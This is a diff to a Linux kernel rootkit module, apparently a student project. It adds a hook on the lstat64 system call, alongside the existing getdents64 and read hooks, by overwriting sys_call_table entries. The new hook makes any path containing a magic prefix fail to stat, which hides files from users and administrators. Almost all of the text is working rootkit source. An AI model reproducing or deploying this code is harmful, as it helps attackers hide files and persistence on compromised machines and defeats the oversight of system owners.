@@ -1,8 +1,6 @@
-/*
-  Hadrien Amrouche, Nicolas Grellety, Bowen Liu, Roland Mounier
-  
-  (c) 2018
-  End of studies' project based on "Android platform based linux kernel rootkit".
+/**
+ * Hadrien Amrouche, Nicolas Grellety, Bowen Liu, Roland Mounier.
+ * End of studies' project based on "Android platform based linux kernel rootkit".
 */
 #include <linux/kernel.h>
 #include <linux/module.h>
@@ -11,6 +9,7 @@
 #include <linux/string.h>  // strstr, strcmp
 #include <linux/types.h>   // size_t
 #include <linux/slab.h>    // alloc fam
+#include <linux/stat.h>    // lstat64
 #include <linux/string.h>  // mem... fam, strlen
 #include <linux/uaccess.h> // copy_from|to_user
 #include <linux/unistd.h>  // read, getuid
@@ -22,6 +21,7 @@ unsigned long *sys_call_table = 0;
 asmlinkage int (*og_getdents64) (int fd,
                                 struct linux_dirent64 *dirp,
                                 unsigned int count);
+asmlinkage int (*og_lstat64) (const char *path, struct stat *buf);
 asmlinkage ssize_t (*og_read) (int fd, char *buf, size_t count);
 
 
@@ -69,6 +69,14 @@ hooked_getdents64(int fd,
 end:
   kfree(kernel_dirent);
   return ret;
+}
+
+asmlinkage int
+hooked_lstat64(const char *path, struct stat *buf) {
+  printk(KERN_INFO "Should not be here\n");
+  if (strstr(path, MAGIC_PREFIX) == NULL)
+    return og_lstat64(path, buf);
+  return -1;
 }
 
 asmlinkage ssize_t
@@ -141,9 +149,11 @@ rootkit_init(void)
     return -1; 
 
   og_getdents64 = sys_call_table[__NR_getdents64];
+  og_lstat64 = sys_call_table[__NR_lstat64];
   og_read = sys_call_table[__NR_read];
 
   sys_call_table[__NR_getdents64] = hooked_getdents64;
+  sys_call_table[__NR_lstat64] = hooked_lstat64;
   sys_call_table[__NR_read] = hooked_read;
   return 0;
 }
@@ -152,6 +162,7 @@ static int __exit
 rootkit_exit(void)
 {
   sys_call_table[__NR_getdents64] = og_getdents64;
+  sys_call_table[__NR_lstat64] = og_lstat64;
   sys_call_table[__NR_read] = og_read;
   return 0;
 }
